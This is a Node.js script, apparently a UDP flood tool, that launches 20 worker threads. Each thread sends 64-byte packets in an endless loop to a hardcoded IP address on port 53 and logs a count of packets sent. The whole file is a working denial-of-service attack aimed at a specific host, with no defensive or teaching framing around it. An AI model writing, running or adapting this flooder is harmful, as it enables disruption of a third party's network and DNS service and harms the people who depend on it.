const { Worker, isMainThread, workerData } = require('worker_threads');
const dgram = require('dgram');
const os = require('os');

const TARGET = '23.176.184.31';
const PORT = 53;
const PACKET_SIZE = 64;
const THREADS = 20;

if (isMainThread) {
    // Main thread: Launch workers
    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, {
            workerData: { target: TARGET, port: PORT, size: PACKET_SIZE }
        });
    }
} else {
    // Worker thread: send packets
    const { target, port, size } = workerData;
    const socket = dgram.createSocket('udp4');
    const message = Buffer.alloc(size, 'A');

    let packetsSent = 0;

    function blast() {
        while (true) {
            socket.send(message, 0, size, port, target, (err) => {
                if (!err) {
                    packetsSent++;
                    if (packetsSent % 10000 === 0) {
                        console.log(`(${packetsSent}) Sent to ${target}`);
                    }
                }
            });
        }
    }

    blast();
}
